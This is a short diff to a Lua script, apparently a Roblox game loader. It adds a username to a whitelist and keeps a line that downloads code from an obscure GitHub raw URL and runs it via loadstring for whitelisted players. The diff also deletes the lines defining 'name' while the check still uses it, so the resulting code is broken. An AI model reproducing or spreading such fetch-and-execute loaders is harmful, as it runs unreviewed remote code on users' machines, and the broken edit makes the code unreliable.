@@ -22,11 +22,10 @@ whitelist = {
     "martin_figueroa21",
     "Trades0219",
     "Rockifails123456",
-    "XaviersGoCrazy"
+    "XaviersGoCrazy",
+    "LGNEUTRO"
 }
 
-local plr = game.Players.LocalPlayer
-local name = game.Players.LocalPlayer.Name
 if table.find(whitelist, name) then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Hcuifhebedi/xufpo0jxjj--/main/Pedjidjdjdhidjm"))()
 else
